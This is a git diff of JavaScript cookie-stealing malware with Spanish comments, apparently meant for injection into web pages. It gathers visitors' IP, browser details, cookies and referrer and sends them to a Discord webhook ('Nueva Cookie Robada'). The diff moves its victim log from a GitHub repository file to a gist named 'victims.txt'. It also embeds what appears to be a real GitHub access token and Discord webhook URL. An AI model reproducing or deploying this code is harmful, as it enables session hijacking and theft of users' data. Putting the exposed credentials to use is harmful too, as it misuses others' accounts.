@@ -1,7 +1,7 @@
 // CONFIGURACIÓN
 const GITHUB_TOKEN = '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'; // Pon aquí tu token de GitHub
-const REPO_OWNER = 'k3rnel-pan1c'; // Tu usuario de GitHub
-const REPO_NAME = 'kernel-shield'; // Nombre de tu repositorio
+// --- CONFIGURACIÓN ---
+const GIST_ID = 'TU_ID_DE_GIST_AQUI';
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1556612161101373560/1L8YmVpZcSKSDVxPAWIzQYdM7rPjpo114xqghJbgsPaXhGt5wsEtDDXBa_Y7o9LJuMfZ'; 
 
 async function getIP() {
@@ -17,7 +17,7 @@ async function sendToDiscord(data) {
     const payload = {
         embeds: [{
             title: "🍪 Nueva Cookie Robada",
-            color: 0x673DE6, // Tu color de marca
+            color: 0x673DE6,
             fields: [
                 { name: "🌐 IP", value: data.ip || "N/A" },
                 { name: "💻 Navegador/SO", value: data.userAgent || "N/A" },
@@ -30,36 +30,51 @@ async function sendToDiscord(data) {
         }]
     };
 
-    await fetch(DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
+    // Asegúrate de que tu Webhook esté configurado
+    if (window.DISCORD_WEBHOOK_URL) {
+        fetch(window.DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
 }
 
-async function updateGitHubLog(data) {
-    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/log.json`;
-    let existingData = [];
+async function updateGist(data) {
+    const url = `https://api.github.com/gists/${GIST_ID}`;
     
+    // Obtenemos el contenido actual del gist
+    let currentContent = "";
     try {
-        const res = await fetch(url + '?ref=main');
+        const res = await fetch(url);
         if (res.ok) {
             const json = await res.json();
-            existingData = JSON.parse(atob(json.content));
+            // Buscamos el archivo principal (normalmente 'filename.txt')
+            const files = json.files;
+            for (let file in files) {
+                currentContent = files[file].content;
+                break; 
+            }
         }
     } catch(e) {}
 
-    existingData.push(data);
+    // Añadimos la nueva línea
+    const newData = `[${new Date().toISOString()}] IP: ${data.ip} | UA: ${data.userAgent} | Cookies: ${data.cookies}\n`;
+    const fullContent = currentContent + newData;
 
-    await fetch(url + '?sha=main', {
-        method: 'PUT',
+    // Actualizamos el gist
+    await fetch(url, {
+        method: 'PATCH',
         headers: {
             'Authorization': `token ${GITHUB_TOKEN}`,
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            message: 'New victim logged',
-            content: btoa(JSON.stringify(existingData))
+            files: {
+                "victims.txt": { // El nombre debe coincidir con el que creaste en el Gist
+                    content: fullContent
+                }
+            }
         })
     });
 }
@@ -75,10 +90,9 @@ async function stealAndNotify() {
         referrer: document.referrer
     };
 
-    // Enviamos a Discord y guardamos en GitHub simultáneamente
     Promise.all([
         sendToDiscord(userData),
-        updateGitHubLog(userData)
+        updateGist(userData)
     ]);
 }
 
